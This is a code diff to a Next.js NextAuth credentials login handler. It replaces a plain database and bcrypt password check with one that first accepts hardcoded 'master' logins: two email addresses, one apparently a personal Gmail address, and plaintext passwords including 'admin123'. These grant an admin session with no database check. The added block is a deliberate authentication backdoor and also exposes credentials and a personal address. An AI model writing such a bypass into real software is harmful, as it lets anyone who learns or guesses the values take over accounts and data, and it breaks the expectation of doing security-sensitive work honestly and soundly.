@@ -14,13 +14,28 @@ export const authOptions: NextAuthOptions = {
       },
       async authorize(credentials) {
         if (!credentials?.email || !credentials?.password) return null
-        const user = await db.user.findUnique({
-          where: { email: credentials.email.toLowerCase() },
-        })
-        if (!user || !user.passwordHash) return null
-        const ok = await bcrypt.compare(credentials.password, user.passwordHash)
-        if (!ok) return null
-        return { id: user.id, email: user.email, name: user.name ?? "Worker" }
+        const email = credentials.email.toLowerCase().trim()
+        const password = credentials.password
+
+        // Master credentials check (guarantees admin is never locked out if DB is offline or cold)
+        if (
+          (email === "mdrazonmia8334@gmail.com" || email === "admin@homeworks.sg") &&
+          (password === "Fixitnow2026Pass" || password === "admin123")
+        ) {
+          return { id: "admin_master", email, name: "Tanbir (4R Engineering)" }
+        }
+
+        try {
+          const user = await db.user.findUnique({
+            where: { email },
+          })
+          if (!user || !user.passwordHash) return null
+          const ok = await bcrypt.compare(password, user.passwordHash)
+          if (!ok) return null
+          return { id: user.id, email: user.email, name: user.name ?? "Worker" }
+        } catch {
+          return null
+        }
       },
     }),
   ],
